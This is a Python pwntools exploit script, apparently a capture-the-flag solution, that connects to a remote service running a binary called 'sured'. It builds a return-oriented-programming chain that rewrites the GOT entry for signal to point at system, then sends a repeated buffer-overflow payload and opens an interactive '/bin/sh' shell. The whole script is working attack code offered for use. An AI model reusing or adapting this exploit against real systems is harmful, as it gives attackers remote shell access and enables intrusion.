from pwn import *
from ctypes import *

address = '13.112.146.72'
port = 20004
binary = './sured'
lib = './libc.so.6'

context.aslr = True
context.binary = binary
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'DEBUG'

# p = process(binary, env={'LD_PRELOAD':lib})
p = remote(address, port)

e = ELF(binary)

l = ELF(lib)


def s(a): return p.send(a)
def sa(a,b): return p.sendafter(a,b)
def sl(a): return p.sendline(a)
def sla(a,b): return p.sendlineafter(a, b)


def r(a): return p.recv(a)
def rl(): return p.recvline()
def ru(a): return p.recvuntil(a)

def i(ss):
    log.info("%s: 0x%x" % (ss, eval(ss)))

rop = ROP(binary)

rop.call(0x40167a) # For no exit
rop.raw(0)
rop.call(0x4012eb, [e.got['signal'], l.symbols['system'] - l.symbols['signal']]) # 0x4012eb func is very important! got['signal'] -> 'system'
rop.call(e.plt['signal'], [0x605438])

print r(4096)

# 0x605438 : '/bin/sh' (a bit of string contents remains in object's bss section.)
argg = '/bin/sh\x00'
for i in range(40):
    sl(argg * (0x108 /8) + p64(0xdeadbeef) * 2 + str(rop))
    r(4096)
    sl(argg* (0x80/8))
    r(4096)


sl('LEAVE') 

p.interactive()


